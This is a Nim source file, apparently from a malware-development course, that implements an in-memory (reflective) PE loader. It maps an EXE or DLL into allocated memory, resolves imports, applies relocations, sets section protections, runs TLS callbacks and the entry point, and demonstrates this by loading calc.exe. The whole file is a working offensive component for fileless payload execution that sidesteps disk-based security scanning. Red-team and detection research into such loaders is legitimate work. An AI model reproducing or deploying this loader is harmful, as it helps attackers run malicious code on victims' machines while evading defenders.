#[
    Author: m4ul3r (@m4ul3r_0x00)
    Reference: Maldev Academy
    License: BSD 3-Clause

    Description: Execute a PE file from memory, support for exes and dlls; support for TLS callbacks and exception handlers.
]#

import winim/lean
import std/[strformat, strutils]

type
  BASE_RELOCATION_ENTRY* {.pure.} = object
    Offset* {.bitsize:12.}: WORD
    Type* {.bitsize:4.}: WORD
  PBASE_RELOCATION_ENTRY* = ptr BASE_RELOCATION_ENTRY

  IMAGE_RUNTIME_FUNCTION_ENTRY_UNION* {.pure, union.} = object
    UnwindInfoAddress*: DWORD
    UnwindData*: DWORD

  IMAGE_RUNTIME_FUNCTION_ENTRY* {.pure.} = object
    BeginAddress*: DWORD
    EndAddress*: DWORD
    u1*: IMAGE_RUNTIME_FUNCTION_ENTRY_UNION
  PIMAGE_RUNTIME_FUNCTION_ENTRY* = ptr IMAGE_RUNTIME_FUNCTION_ENTRY

proc localPeExec*(pPeFileBuffer: pointer, sPeFileSize: int, cExportedFuncName: LPCSTR = cast[LPCSTR](0)): bool =
  ## `localPeExec` expects 3 arguments: a pointer to where the PE file has been allocated in memory, the size of the
  ## PE file in memory, and an optional argument of an exported function name if executing a DLL file. 
  var
    uBaseAddress, uExportedFuncAddress: pointer
    uDeltaOffset: int
    pImgNtHdrs: PIMAGE_NT_HEADERS
    pImgSecHdr: PIMAGE_SECTION_HEADER
    pTmpDataDirVar: PIMAGE_DATA_DIRECTORY
    pImgDescriptor: PIMAGE_IMPORT_DESCRIPTOR
    pImgBaseRelocation: PIMAGE_BASE_RELOCATION
    pBaseRelocEntry: PBASE_RELOCATION_ENTRY
    pImgRuntimeFuncEntry: PIMAGE_RUNTIME_FUNCTION_ENTRY
    pImgExportDir: PIMAGE_EXPORT_DIRECTORY
    pImgTlsDirectory: PIMAGE_TLS_DIRECTORY
    ppImgTlsCallback: ptr UncheckedArray[PIMAGE_TLS_CALLBACK]
    threadContext: CONTEXT

  pImgNtHdrs = cast[PIMAGE_NT_HEADERS](cast[int](pPeFileBuffer) + cast[PIMAGE_DOS_HEADER](pPeFileBuffer).e_lfanew)
  if (pImgNtHdrs.Signature != IMAGE_NT_SIGNATURE):
    return false

  # Allocate memory
  uBaseAddress = VirtualAlloc(NULL, pImgNtHdrs.OptionalHeader.SizeOfImage, MEM_RESERVE or MEM_COMMIT, PAGE_READWRITE)
  if cast[int](uBaseAddress) == 0:
    echo "[!] VirtualAlloc Failed With Error: ", GetLastError()
    return false

  echo &"[!] Allocated Image Base Address: 0x{cast[int](uBaseAddress).toHex}"
  echo &"[i] Preferable Base Address: 0x{cast[int](pImgNtHdrs.OptionalHeader.ImageBase).toHex}"

  # Writing PE Sections
  pImgSecHdr = IMAGE_FIRST_SECTION(pImgNtHdrs)
  var pImgSecHdrArr = cast[ptr UncheckedArray[IMAGE_SECTION_HEADER]](pImgSecHdr)
  echo "[i] Writing Payload's PE Sections ..."
  for i in 0 ..< pImgNtHdrs.FileHeader.NumberOfSections.int:
    echo &"\t<i> Writing Section {cast[cstring](pImgSecHdrArr[i].Name[0].addr)} at 0x{(cast[int](uBaseAddress) + pImgSecHdrArr[i].VirtualAddress).toHex} of Size {cast[int](pImgSecHdrArr[i].SizeOfRawData)}" 
    copyMem(
      cast[pointer](cast[int](uBaseAddress) + pImgSecHdrArr[i].VirtualAddress),
      cast[pointer](cast[int](pPeFileBuffer) + pImgSecHdrArr[i].PointerToRawData),
      pImgSecHdrArr[i].SizeOfRawData
    )

  # Fix Import Address Table
  stdout.write "[i] Fixing The Import Address Table ... "
  pTmpDataDirVar = pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT]
  for i in countUp(0, pTmpDataDirVar.Size-1, sizeof(IMAGE_IMPORT_DESCRIPTOR)):
    pImgDescriptor = cast[PIMAGE_IMPORT_DESCRIPTOR](cast[int](uBaseAddress) + pTmpDataDirVar.VirtualAddress + i)
    if (pImgDescriptor.union1.OriginalFirstThunk == 0) and (pImgDescriptor.FirstThunk == 0):
      break
    var 
      cDllName = cast[LPSTR](cast[int](uBaseAddress) + pImgDescriptor.Name)
      uOriginalFirstThunkRVA = pImgDescriptor.union1.OriginalFirstThunk
      uFirstThunkRVA = pImgDescriptor.FirstThunk
      imgThunkSize:int = 0
      hModule: HMODULE
    hModule = LoadLibraryA(cDllName)
    if cast[int](hModule) == 0:
      echo &"[!] LoadLibraryA Failed With Error: {GetLastError()}"
      return false
    while true:
      var
        pOriginalFirstThunk = cast[PIMAGE_THUNK_DATA](cast[int](uBaseAddress) + uOriginalFirstThunkRVA + imgThunkSize)
        pFirstThunk = cast[PIMAGE_THUNK_DATA](cast[int](uBaseAddress) + uFirstThunkRVA + imgThunkSize)
        pImgImportByName: PIMAGE_IMPORT_BY_NAME = nil
        pFuncAddress: pointer = nil

      if (pOriginalFirstThunk.u1.Function == 0) and (pFirstThunk.u1.Function == 0):
        break

      if (IMAGE_SNAP_BY_ORDINAL(pOriginalFirstThunk.u1.Ordinal)):
        pFuncAddress = GetProcAddress(hModule, cast[LPCSTR](IMAGE_ORDINAL(pOriginalFirstThunk.u1.Ordinal)))
        if cast[int](pFuncAddress) == 0:
          echo &"[!] Could Not Import !{cast[cstring](cDllName)}#{pOriginalFirstThunk.u1.Ordinal}"
          return false
      else:
        pImgImportByName = cast[PIMAGE_IMPORT_BY_NAME](cast[int](uBaseAddress) + pOriginalFirstThunk.u1.AddressOfData)
        pFuncAddress = GetProcAddress(hModule, cast[LPCSTR](pImgImportByName.Name[0].addr))
        if cast[int](pFuncAddress) == 0:
          echo &"[!] Could Not Import !{cast[cstring](cDllName)}.{cast[cstring](pImgImportByName.Name)}"
          return false

      pFirstThunk.u1.Function = cast[ULONGLONG](pFuncAddress)
      imgThunkSize += sizeof(IMAGE_THUNK_DATA)

  echo "[+] DONE"

  # Perform PE Relocation
  stdout.write "[i] Fixing PE Relocations ... "
  pTmpDataDirVar = pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC]
  pImgBaseRelocation = cast[PIMAGE_BASE_RELOCATION](cast[int](uBaseAddress) + pTmpDataDirVar.VirtualAddress)
  uDeltaOffset = cast[int](uBaseAddress) - pImgNtHdrs.OptionalHeader.ImageBase

  while (cast[int](pImgBaseRelocation.VirtualAddress) != 0):
    pBaseRelocEntry = cast[PBASE_RELOCATION_ENTRY](cast[int](pImgBaseRelocation) + sizeof(PBASE_RELOCATION_ENTRY))

    while (cast[PBYTE](pBaseRelocEntry) != cast[PBYTE](cast[int](pImgBaseRelocation) + pImgBaseRelocation.SizeOfBlock)):
      case pBaseRelocEntry.Type:
      of IMAGE_REL_BASED_DIR64:
        var tmp = cast[ptr ULONG_PTR](cast[int](uBaseAddress) + pImgBaseRelocation.VirtualAddress + pBaseRelocEntry.Offset.int)
        tmp[] += uDeltaOffset
      of IMAGE_REL_BASED_HIGHLOW:
        var tmp = cast[ptr DWORD](cast[int](uBaseAddress) + pImgBaseRelocation.VirtualAddress + pBaseRelocEntry.Offset.int)
        tmp[] += + uDeltaOffset.DWORD
      of IMAGE_REL_BASED_HIGH:
        var tmp = cast[ptr WORD](cast[int](uBaseAddress) + pImgBaseRelocation.VirtualAddress + pBaseRelocEntry.Offset.int)
        tmp[] += HIWORD(uDeltaOffset)
      of IMAGE_REL_BASED_LOW:
        var tmp = cast[ptr WORD](cast[int](uBaseAddress) + pImgBaseRelocation.VirtualAddress + cast[int](pBaseRelocEntry.Offset))
        tmp[]  += LOWORD(uDeltaOffset) 
      of IMAGE_REL_BASED_ABSOLUTE:
        # increment pBaseRelocEntry since we break out of the while loop
        pBaseRelocEntry = cast[PBASE_RELOCATION_ENTRY](cast[int](pBaseRelocEntry) + sizeof(BASE_RELOCATION_ENTRY))
        break
      else:
        echo &"[!] Unknown relocation type: {pBaseRelocEntry.Type} | Offset: 0x{cast[int](pBaseRelocEntry.Offset).toHex}"
        return false
      pBaseRelocEntry = cast[PBASE_RELOCATION_ENTRY](cast[int](pBaseRelocEntry) + sizeof(BASE_RELOCATION_ENTRY))

    pImgBaseRelocation = cast[PIMAGE_BASE_RELOCATION](pBaseRelocEntry)
  
  echo "[+] Done"

  # Fix Memory Permissions
  echo "[+] Setting the Right Memory Permissions For Each PE Section"
  for i in 0 ..< pImgNtHdrs.FileHeader.NumberOfSections.int:
    var dwProtection, dwOldProtection: DWORD
    if (pImgSecHdrArr[i].SizeOfRawData == 0) or (pImgSecHdrArr[i].VirtualAddress == 0):
      continue
    if (pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_WRITE) != 0:
      dwProtection = PAGE_WRITECOPY
    if (pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_READ) != 0:
      dwProtection = PAGE_READONLY
    if ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_WRITE) != 0) and ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_READ) != 0):
      dwProtection = PAGE_READWRITE
    if (pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_EXECUTE) != 0:
      dwProtection = PAGE_EXECUTE
    if ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_EXECUTE) != 0) and ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_WRITE) != 0):
      dwProtection = PAGE_EXECUTE_WRITECOPY
    if ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_EXECUTE) != 0) and ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_READ) != 0):
      dwProtection = PAGE_EXECUTE_READ
    if ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_EXECUTE) != 0) and ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_WRITE) != 0) and ((pImgSecHdrArr[i].Characteristics and IMAGE_SCN_MEM_READ) != 0):
      dwProtection = PAGE_EXECUTE_READWRITE
    
    if VirtualProtect(cast[PVOID](cast[int](uBaseAddress) + pImgSecHdrArr[i].VirtualAddress), pImgSecHdrArr[i].SizeOfRawData, dwProtection, dwOldProtection.addr) == 0:
      echo &"[!] VirtualProtect {cast[cstring](pImgSecHdrArr[i].Name[0].addr)} Failed With Error: {GetLastError()}"
      return false

  # Fetch Exported Function Address
  if (cast[int](cExportedFuncName) != 0):
    pTmpDataDirVar = pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]
    pImgExportDir = cast[PIMAGE_EXPORT_DIRECTORY](cast[int](uBaseAddress) + pTmpDataDirVar.VirtualAddress)
    if (pTmpDataDirVar.Size != 0) and (pTmpDataDirVar.VirtualAddress != 0):
      var
        functionNameArr = cast[ptr UncheckedArray[DWORD]](cast[int](uBaseAddress) + pImgExportDir.AddressOfNames)
        functionAddressArr= cast[ptr UncheckedArray[DWORD]](cast[int](uBaseAddress) + pImgExportDir.AddressOfFunctions)
        functionOrdinalArr= cast[ptr UncheckedArray[WORD]](cast[int](uBaseAddress) + pImgExportDir.AddressOfNameOrdinals)
      for i in 0 ..< pImgExportDir.NumberOfFunctions:
        if cast[cstring](cExportedFuncName) == cast[cstring](cast[int](uBaseAddress) + functionNameArr[i]):
          uExportedFuncAddress = cast[pointer](cast[int](uBaseAddress) + functionAddressArr[functionOrdinalArr[i]])
          echo &"[i] Fetched Optional Exported Function Address [ {cast[cstring](cExportedFuncName)}:0x{cast[int](uExportedFuncAddress)} ]"
          break

  # Register Exception Directory
  pTmpDataDirVar = pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION]
  if pTmpDataDirVar.Size != 0:
    pImgRuntimeFuncEntry = cast[PIMAGE_RUNTIME_FUNCTION_ENTRY](cast[int](uBaseAddress) + pTmpDataDirVar.VirtualAddress)
    if RtlAddFunctionTable(cast[PRUNTIME_FUNCTION](pImgRuntimeFuncEntry), (pTmpDataDirVar.Size div sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY)).DWORD, cast[DWORD64](uBaseAddress)) == 0:
      echo &"[!] RtlAddFunctionTable Failed With Error: {GetLastError()}"
      return false
    echo "[+] Registered Exception Handlers"
  
  # Execute TLS Callbacks
  pTmpDataDirVar = pImgNtHdrs.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS]
  if pTmpDataDirVar.Size != 0:
    pImgTlsDirectory = cast[PIMAGE_TLS_DIRECTORY](cast[int](uBaseAddress) + pTmpDataDirVar.VirtualAddress)
    ppImgTlsCallback = cast[ptr UncheckedArray[PIMAGE_TLS_CALLBACK]](pImgTlsDirectory.AddressOfCallBacks)
    var i = 0
    while (cast[int](ppImgTlsCallback[i])) != 0:
      var pCallback = cast[proc(hModule: PVOID, dwReason: DWORD, pContext: PVOID){.nimcall.}](ppImgTlsCallback[i])
      pCallBack(uBaseAddress, DLL_PROCESS_ATTACH, threadContext.addr)
      i.inc
    echo "[+] Executed All TLS Callback Functions"

  # Execute Entry Point
  if (pImgNtHdrs.FileHeader.Characteristics and IMAGE_FILE_DLL) != 0:
    var 
      pDllMainFunc = cast[proc(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) {.nimcall.}](cast[int](uBaseAddress) + pImgNtHdrs.OptionalHeader.AddressOfEntryPoint)
      hThread: HANDLE

    echo "[*] Executing DllMain ..."
    pDllMainFunc(cast[HINSTANCE](uBaseAddress), DLL_PROCESS_ATTACH, NULL)

    if cast[int](uExportedFuncAddress) != 0:
      echo &"[*] Executing The {cExportedFuncName} Exported Function ... "
      hThread = CreateThread(NULL, 0, cast[LPTHREAD_START_ROUTINE](uExportedFuncAddress), NULL, 0, NULL)
      if cast[int](hThread) == 0:
        echo &"[!] CreateThread Failed With Error: {GetLastError()}"
        return false
      WaitForSingleObject(hThread, INFINITE)

  else:
    echo "[*] Executing Main ..."
    var pMainFunc = cast[proc(){.nimcall.}](cast[int](uBaseAddress) + pImgNtHdrs.OptionalHeader.AddressOfEntryPoint)
    # Execution of this program will terminate after this call. It is best to use CreateThread if you need continuous execution
    pMainFunc()

  return true


proc main() =
  var 
    target = r"C:\Windows\System32\calc.exe"
    peData = readFile(target)
    pBuffer = alloc0(peData.len)
  copyMem(pBuffer, peData[0].addr, peData.len)

  discard localPeExec(pBuffer, peData.len)


when isMainModule:
  main()